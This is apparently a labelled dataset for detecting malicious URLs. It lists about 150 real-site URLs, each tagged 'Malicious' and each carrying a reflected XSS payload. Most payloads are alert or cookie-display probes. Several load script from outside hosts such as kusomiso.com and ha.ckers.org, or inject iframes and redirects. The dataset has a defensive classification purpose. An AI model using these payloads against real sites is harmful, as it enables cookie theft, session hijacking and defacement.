http://www.turkstat.gov.tr/kp/kullanici/forgotpassword.do?reqcode=pre%3cscript%3ealert(document.cook<br>ie);%3c/script%3epareforgotpasswordform,Malicious
http://www.inde.gob.pa/default.asp?id=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/scr<br>ipt%3e,Malicious
http://www.lauda-koenigshofen.com/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nvidia.fr/content/driverdownload/widget_code.asp?lang=%3c/textarea%3e%27%22%3e%3c/title%3<br>e%3cscript%3ealert(1337)%3c/script%3e,Malicious
https://newsletter.lufthansa.com/servlet/campaignrespondent?_id_=lh.6059&amp;email_address=%22%3e%3cscri<br>pt%3ealert%28document.cookie%29%3c/script%3e&amp;email_address2=%22%3e%3cscript%3ealert%28document.cooki<br>e%29%3c/script%3e&amp;gender=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;title=%22%3e%3csc<br>ript%3ealert%28document.cookie%29%3c/script%3e&amp;first_name=%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e&amp;surname=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;country_code=be&amp;la<br>nguage=e&amp;p=id__en_enr_0310#,Malicious
http://kids.dailymotion.com/pageitem/video/player?dispatch=1&amp;request=%2fvideo%2fx7pm1h&amp;masscastlocat<br>ion=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xyli<br>tol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%<br>3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;playlist_id=%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.pornograb.com/index.php?st=1&amp;num=25&amp;new=1&amp;q=&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;&amp;stype=vid&amp;sort=date&amp;vtype=&amp;button=find,Malicious
http://warp.ndl.go.jp/cgi-bin/netwp/bnwplinkchk.cgi?fl=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/t<br>itle%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3e<br>norehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.<br>cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jer<br>sain.iespana.es/xss.html%20%3c&amp;mt=000000002222&amp;cl=00000000000023108&amp;ln=[ls],Malicious
http://www.forextips.com/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.airbus.com/en/myairbus/multimedialibrary/search_mmlib.jsp?year=2010&amp;month=1&amp;category=phot<br>ography&amp;words=%2band%2bairbus%253a%2522mmcategory_photography%2523events%2522%2band%2bairbus%253a%25<br>22templatetype_mmlib%2522&amp;hitsperpage=10&amp;hitspersite=0&amp;searchtype=index&amp;menuflashindex=1&amp;category_1=<br>photography&amp;category_2=photography%23products%23a300_a310&amp;keyword=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20b<br>y%20turkpower')%3b&lt;/script&gt;,Malicious
http://www.pog.gov.ge/ge/adv_search.php?q=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e&amp;x=0&amp;y=0,Malicious
http://www.mef.k12.tr/okullar/yonlendir/yonlendir.asp?url=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&quot;skyr3x&quot;)&lt;/script<br>&gt;,Malicious
http://myschool.in.com/search/%3cscript%3ealert%28/xss%20by%2003storic/%29%3c/script%3e/1,Malicious
http://www.yurtpartisi.org.tr/video/default.asp?catid=27&amp;cat=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://www.football4less.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://boourns.cjb.net/images.php?tag=%22%3e%3cscript%3ealert%28/xss/.source%29%3c/script%3e,Malicious
http://www.ericsson.com/nsearch?restrictiontype=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scri<br>pt%3e,Malicious
http://mitworld.mit.edu/search.php?q=%27%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%2<br>9%2f%2f%5c%27%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f%22%3balert%28string<br>.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2884%2c69%2c8<br>3%2c84%2c69%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2884%<br>2c69%2c83%2c84%2c69%29%29%3c%2fscript%3e&amp;x=0&amp;y=0&amp;r=10,Malicious
http://sourceforge.net/search/?type_of_search=soft&amp;type_of_search=soft&amp;words=%22%3e%3cscript%3ealert<br>(%22cruelwolf%22)%3c/script%3e,Malicious
http://www.jagbytes.com/media/storage/paper1244/news/2008/10/08/collegenews/smoking.or.non.tobacco.c<br>ompanies.target.college.students-3477813.shtml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script<br>%3e%3e%3cscript%3ealert(1337)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marque<br>e%3e,Malicious
http://www.full-albums.net/search/?find=%22%3e%3cscript+src%3dhttp%3a%2f%2fwww.fileden.com%2ffiles%2<br>f2008%2f1%2f10%2f1691310%2fxss.gif%3e&amp;search=albums,Malicious
http://www.workcover.vic.gov.au/wps/wcm/connect/worksafe/support/search+results?search=x%22%3e%27%3e<br>%3cscript%3ealert%28123%29%3c%2fscript%3e%22,Malicious
http://www.deu.edu.tr/deuweb/etkinlik/etkinlik.php?etkinlik_no=1259&amp;title=''&gt;&lt;/script&gt;&lt;script&gt;alert(<br>document.cookie)&lt;/script&gt;&lt;h1&gt;xssbynarcoticxs&lt;/h1&gt;,Malicious
http://icthewharf.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br>/)%3c/script%3e%3cp,Malicious
http://www3.agr.gc.ca/apps/infohort/index.cfm?action=dsphome&amp;lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.exblog.jp/blog/blog_preview.asp?eid=c0089040&amp;fmt=pbskin&amp;blogskin=a01084&amp;template=01&amp;skinl<br>oc=left&amp;skindiv='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://boards.myway.com/jsp/topicview.jsp?va=1&amp;tid=2262482%22%3e'%3e%22%3c'%3c%3cscript%3e%3c/script<br>%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.nccbank.com.np/displaynews.php?id=99%3e%3cscript%3ealert%281337%29%3c/script%3e%3ch1%3e%3<br>cmarquee%3exss%20by%20rohit%20bansal%3c/marquee%3e%3c/h1%3e,Malicious
http://www.aginnovazione.gov.it/it/services/search.html?query=%22%3e%3cscript%3ealert%281337%29%3c%2<br>fscript%3e&amp;bt_cerca=,Malicious
http://www.teengrowth.com/index.cfm?action=info&amp;category=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://my.dot.tk/registration/mailsignup?firstname=""><script>alert('by ebanyu.com.ar')</script>&lastname=fun",Malicious
https://fuse.education.vic.gov.au/secondary/pages/results.aspx?s=%22%3e%3ciframe%20src=%22http://xss<br>ed.com%22%3e,Malicious
http://marketwatch.nytimes.com/custom/nyt-com/html-companyprofile.asp?mw=http://marketwatch.nytimes.<br>com/custom/nyt-com/html-companyprofile.asp&amp;symb=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;x=0&amp;y=0,Malicious
http://search.hmcourts-service.gov.uk/kbroker/dca/hmcs/search.jsp?ln=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scri<br>pt&gt;,Malicious
http://ip.tosp.co.jp/b.asp?bn='%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;ip=test,Malicious
http://www.photos.com/en/search/index?srch=search&amp;k_var=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fk<br>usomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://asd-www.larc.nasa.gov/scool/register/index.php?lang=%27%22%3e%3cimg%20src=foo.png%20onerror=a<br>lert(/xss/)%20/%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exssby%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://akron.bbb.org/wwwroot/search.aspx?site=&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e,Malicious
http://ojs.lib.swin.edu.au/index.php/ejap%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%27%22<br>%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.webpagedirectory.com/novap/search.html?lrn=10&amp;sprm=keywords+only&amp;tld=all&amp;keywords=%22%3e%<br>27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://opinionjournal.com/editorial/feature.html?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.shop.com/+-a-%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript%3ealert%28%2fxss%<br>2f%29%3c%2fscript%3e%22%3e%3e%3c%3cbody+onload%3dprompt%28document%2edomain%29%3e-st.shtml,Malicious
http://framedart.walmart.com/search/results.asp?keywords=%3c%2fspan%3e%3cscript%3ealert(1);%3c%2fscr<br>ipt%3e&amp;reset=y,Malicious
http://www.sisef.it/iforest/contents/?id=ifor0469-0010141%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://sobar.soso.com/sobar.q?op=searchpost&amp;kw=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3cifram<br>e%20src=%22http://www.xssed.com%22%3e&amp;pid=b.idx&amp;cid=w.q.in.sb.web,Malicious
http://gifts.laborant.org.ua/search.php?q=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e&amp;aff=25236&amp;<br>saff=14,Malicious
http://ms152.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://search-recherche.collectionscanada.ca/archives/search.jsp?language='%22%3e%3ch1%3erubberduck%<br>3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.qthxm.gov.cn/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3<br>e&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious
http://hj.shop.kingsoft.com/smspage/error.php?error=%3cscript%3ealert%281337%29%3c/script%3e,Malicious
http://video.icq.com/video/video_results.php?q=rutube&amp;mode=%22%3e%3cscript%3ealert%28test%29%3c/scri<br>pt%3e%20%3cmarquee%20behavior=%22alternate%22%20direction=%22right%22%20bgcolor=%22green%22%3exssed.<br>com%20...insecurity.ro%3c/marquee%3e;%3cimg%20src=%22http://i55.tinypic.com/dy3brm.gif%22%3e;%3cifra<br>me%20src%20=http://www.youtube.com/watch?v=qbn0g8-zbdy%22%20width=%220%22%20height=%220%22%20\%3e%3c<br>/div%3e,Malicious
"http://dk.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious
"http://modis-atmos.gsfc.nasa.gov/staff.php?sup_id=15&amp;sidact=';alert(string.fromcharcode(88,83,83))//<br>\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string<br>.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83<br>))%3c/script%3e",Malicious
http://docweb.estesl.ipl.pt/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;<br>script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://3.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://gnu-darwin.sourceforge.net/index.php?page=%3c/title%3e%3cscript%3ealert(%22vulnerabilit%e0%20<br>xss.%20by%20nakky%ae%22);%3c/script%3e,Malicious
http://jp.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.aberdeenshire.gov.uk/publictransport/timetables/search.asp?strsearch=dinnet&quot;&gt;&lt;script&gt;aler<br>t(&quot;bluemax&quot;)&lt;/script&gt;,Malicious
http://www.freewebs.com/noobweb/apps/photos/search?q=%22%3e%3cscript%3ealert(&quot;gotcha<br>bitch!&quot;)%3c/script%3e,Malicious
http://www.freesound.org/searchtext.php?search=%22%3e%3c/title%3e%22%3e%3cscript%3ealert(/xs%20by%20<br>warvector%20!/);%3c/script%3e%3cmarquee%3e%3ch1%3exs%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e,Malicious
http://fanatikleri.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://www.faith-go.co.jp/lists/itemlist3_parts.asp?cid=00308&amp;fl=1,2,5,6&amp;n_name=rdt241w%22%3e'%3e%3c<br>/script%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e",Malicious
"http://www.antagonistikotita.gov.gr/epan/site/search/t_section2?keyword=%3cscript%3ealert(string.fro<br>mcharcode(83,116,64,82,45,103,97,90,51,114))%3c/script%3e%3cmarquee%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c<br>/marquee%3e&amp;imagefield.x=0&amp;imagefield.y=0&amp;submitted=yes",Malicious
http://www.turismoruralperu.gob.pe/index.php?fp_plantilla_seleccionada_temporal=82%22%3e%3cscript%3e<br>alert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,Malicious
http://www.pokerigre.rs/uplata.php?id=12%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://antivirus.hisoft.com.ar/search.php?query=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bank.rs.ru/ru/search/?ul67=http%253a%252f%252fwww.bank.rs.ru&amp;q67=%27%22%3e%3c/title%3e%3c<br>script%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%2<br>7%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c<br>/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3<br>exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;wf67=222210&amp;ps67=10&amp;x=0&amp;y=0,Malicious
http://www.brebanca.it/sit/public/accesso_negato.jsp?url=%22%3e%3cscript%3ealert%28%2fxss+by+redtuni<br>ng%2f%29%3b%3c%2fscript%3e,Malicious
https://www.psy-help-online.ch/index-de.php?frameset=104&amp;searchtext=%22%3e%3cscript%3ealert%281%29;%<br>3c/script%3e,Malicious
http://dianas-argentum.2-kennels.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://results.testfest.php.net/viewfilecontents.php?file=%3cscript%3ealert%28/www.xssed.com/%29%3c/<br>script%3e,Malicious
http://iascl.talkbank.org/membershiplist.html?query=a-d%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.ebartan.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
"http://evision.utb.edu/ordertickets.asp?p=255&amp;backurl=';alert(string.fromcharcode(88,83,83))//\';ale<br>rt(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromcharc<br>ode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://lavillette.com/recherche/?q=<script>document.write(string.fromcharcode(60, 105, 102, 114, 97,109, 101, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 120, 115, 115, 101, 100, 46, 99,111, 109, 34, 62))</script>",Malicious
http://www.adiguzel.k12.tr/ilk/galeri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://icrenfrewshire.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced<br>.org/)%3c/script%3e%3cp,Malicious
http://www.imperial.ac.uk/library/eresources/search.asp?action=search&amp;radsearchtype=id&amp;txtsearch1=42<br>8&amp;firstrecord=1&amp;txtrecordcount=10&amp;letter=n&amp;page=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/<br>scripts/hotpockets.js%3e,Malicious
http://www.exodusbooks.com/title.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://biotech.icmb.utexas.edu/search/dict-search2.html?bo1=and&amp;word=%27%22%3e%3e%3cmarquee%3e%3ch1%<br>3e%3cstrong%3ecueballr%3c%2fstron&amp;search_type=normal&amp;def=%27%22%3e%3e%3cmarquee%3e%3ch1%3e%3cstrong%<br>3ecueballr%3c%2f,Malicious
http://rules.nyse.com/nysetools/tocchapter.asp?searched=1&amp;cirestriction=412&amp;divid=chp_1_5_7_17&amp;manua<br>l=/nyse/nyse_rules/nyse-rules/chp_1_5/default.asp&amp;selectednode=%3c/script%3e%3cscript%3ealert()%3c/s<br>cript%3e,Malicious
http://webdirectory.natlib.govt.nz/cgi-bin/search?collection=all&amp;search=%22%3e%3cscript%3ealert%2812<br>3%29%3c%2fscript%3e%22&amp;display=10,Malicious
http://icservices.epfl.ch/profs/person.asp?lang=fr&amp;sciper=104905&amp;title=&lt;script&gt;alert(&quot;scriptorium(tu<br>rkey)&quot;)&lt;/script&gt;,Malicious
http://medic.naver.com/search.nhn?dic_where=medic&amp;query_utf=%22%3e%3cscript%20src=http://ha.ckers.or<br>g/xss.js%3e%3c/script%3e,Malicious
http://www.php-pur.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.highchem.co.jp/asp/search.asp?keyword='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e<br>%3c/script%3e,Malicious
http://sites.target.com/site/en/spot/store_locator_new.jsp?&amp;startaddress=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;&quot;,Malicious
http://www.processor.com/listings/forsale/list.asp?guid=f3de8213d2e94912ab2d79983feb52c7&amp;etid=1&amp;part<br>number=&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;partnumx=contains&amp;submit2=search,Malicious
http://www.nr3c.gov.pk/blog.php?blog_id=1%3e%22%3e%3cscript%20%0a%0d%3ealert(/hacked%20by%20rohit%20<br>bansal/)%3b%3c/script%3e%3ch1%3edefaced%20by%20rohit%20bansal%3c/h1%3e%3c/marquee%3e,Malicious
http://www.newsomart.com/image.php?id=625%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
https://ds-web.c3pki.chamb.disa.mil/clients/dsgw/bin/lang?context=dsgw%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by,Malicious
http://www.ex-police.or.kr/modules/board/bd_view.html?id=board_news&amp;no=49'%22%3e'%3e%22%3c'%3c%3cscr<br>ipt%3e%3c/script%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://se.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious
"http://www.gofish.com/search.gfp?keywords=';alert(string.fromcharcode(88,83,83))//\';alert(string.fr<br>omcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,8<br>3,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;x=<br>0&amp;y=0",Malicious
http://php.blink.pl/info.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.php-only.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.sportsline.com/login?xurl=http%3a%2f%2fwww.sportsline.com%2f&amp;master_product=150&amp;id=%22%3c<br>script%3ealert%28%27gurus+here%21%21%27%29%3c%2fscript%3e&amp;password=&amp;x=75&amp;y=11,Malicious
http://szukaj.wp.pl/szukaj.html?szukaj=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e&amp;z=e,Malicious
http://www.mods.dk/index.php?modelid=549&amp;radiorec=motorola%22%3e%3cscript%3ealert(/ccc/)%3c/script%3<br>e,Malicious
http://www.imagine.gr/basketball/index.asp?v=5&amp;t=t&amp;id=1&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br>script&gt;,Malicious
https://dct.sun.com/dct/forms/reg_us_0604_101_0.jsp?email=xylitol@fbi.gov&amp;mid=1161186194&amp;cid=e83%27%<br>22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e75g,Malicious
http://www.nrl.navy.mil/redirect.php?url=%22/%3e%3c/a%3e%3c/%3e%3cimg%20src=1.gif%20onerror=alert(13<br>37)%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exssby%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.avm.de/partneravm/marketing/fritz_clips/start_clip.php?clip='%3e%3c/noscript%3e%3cscript%<br>20src=http://ha.ckers.org/xss.js%3e%3c/script%3e,Malicious
http://photo.english.chosun.com/dailynews/view.do?category=2&amp;gubun=eng?gubun=daily_news_item&amp;idx=%22<br>%3e%3ciframe%20src=/%3e%3c/iframe%3e,Malicious
http://eric.ed.gov/ericwebportal/home.portal?_nfpb=true&amp;_pagelabel=eric_search&amp;error=%22%3e%3cscript<br>%3ealert(1337)%3c/script%3e,Malicious
http://ad.globe7.com/rw?title=pkr.com%20-%20the%20ul%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3etimate%20in%20online%20poker&amp;qs=iframe3%3f2ya.ailubgcqawca3gebaaiaiaaaap8aaaaheaicaamt5gkah<br>eogalsdagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaqcn2qui.aadlaqkm4j8bambemm.upwaa061y6e4.t-xexipp9z8aalafmmf3p<br>waaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaau9aakb9eiabmiyam9audpd5j6vxntkzhnwgaaaaaaaa%3d%2c%2chttp%<br>3a%2f%2fdownloads.ziddu.com%2fdownloadfile%2f4140493%2fnfo_diz_viewer-red.rar.html,Malicious
http://www.irtik.com/search/?terms=%22%3e%3cfont+size%3d%2211%22%3egurus%3c%2ffont%3e%3cbr%3e%3cmarq<br>uee%3edont+mess+with+us%3c%2fmarquee%3e%3cscript%3ealert%28%27the%2bfuture%2bis%2bours%27%29%3c%2fsc<br>ript%3e&amp;type=post,Malicious
http://www.startrek.com/startrek/view/search/result.html?type=article&amp;search=%22%3e%3c%2fa%3e%3cscri<br>pt%3ealert(%22pappy%20says%3a%20star%20wars%20is%20better%22)%3b%3c%2fscript%3e&amp;category=,Malicious
http://www.loix-studio.com/pedobear/image.php?img=%27%22%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://rd.or.tp/kiken_url_list/search.php?u=c%00%22%22%3cscript%3ealert(0);%3c/script%3e,Malicious
http://www.geovisite.com/admin/index.php?lg=%22%3e%3cscript%3ealert(1337);%3c/script%3e%3cmarquee%3e<br>%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e,Malicious
http://www.takepride.gov/volunteer/results.cfm?fzip=&quot;&gt;&lt;script&gt;alert(&quot;xss found by<br>rugburn&quot;)&lt;/script&gt;&lt;a id=&quot;,Malicious
http://www.developer-network.org/suggestions-feedback/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,Malicious
http://kb.doubleclick.net/help/search.asp?backpage=%22%27/%3e%3cscript%3ealert(%22oops%22)%3c/script<br>%3e,Malicious
http://www.premiumpass.com/site/%3cmarquee%3edefaced_by_ironzorg;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious
"http://olivia.aviation-civile.gouv.fr/index.php?lang=fr&amp;ref=%22%3e%3cscript%3ealert(string.fromcharc<br>ode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e",Malicious
http://xain.net/d_chaku/search.cgi?key=%3c/title%3e%e7%b5%a2%e9%a6%99%22%3e%3cbody%20onload%3dalert%<br>28%27kusomiso%2ecom%27%29%3e,Malicious
http://www.tft.rs/search.php?q=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;city=n<br>s&amp;=pretra%bei,Malicious
http://www.southerncostaricamap.com/search/search.php?query=&lt;%2ftextarea&gt;'&quot;&gt;&lt;script&gt;alert(document.c<br>ookie)&lt;%2fscript&gt;&amp;search=1,Malicious
http://www.tmb.in/site_search/our_internal_site_search.html?search_text=%22%3e%3cscript%3ealert%28%2<br>2+xssed+by+snypter%22%29%3c%2fscript%3e&amp;x=0&amp;y=0&amp;searchtype=site,Malicious
http://crypto.stanford.edu/cs155old/cs155-spring09/proj3/sendmail.php?to=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/sc<br>ript&gt;,Malicious
http://www.portaldoservidor.pa.gov.br/search.cfm?paction=6&amp;pcod_noticia=0&amp;pnum_pagina=1&amp;pnum_registr<br>os=30&amp;pfiltro_tit_noticia=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscr<br>ipts%2fpython5.js%3e%3c%2fscript%3e&amp;pnum_coluna_ord=1,Malicious
http://www.fetedelascience.education.gouv.fr/consultation_public/region_consult.php?noregion=%22%3e'<br>%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
https://www.united-internet-for-unicef-stiftung.de/emergency-myanmar.html?mid=2&amp;ac=--%3e%3cscript%3e<br>alert('gasmo')%3c/script%3e%3c!--,Malicious
http://promotions.vogue.com.au/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://www.isys-bw.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.theglobeandmail.com/servlet/appnoticearticlehtmltemplate?tf=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrio<br>r.org&quot;)&lt;/script&gt;,Malicious
http://www.nmmzt.gov.cn/c.ss/subm.asp?id=%3cscript%3ealert(%22milisx%22)%3c/script%3e,Malicious
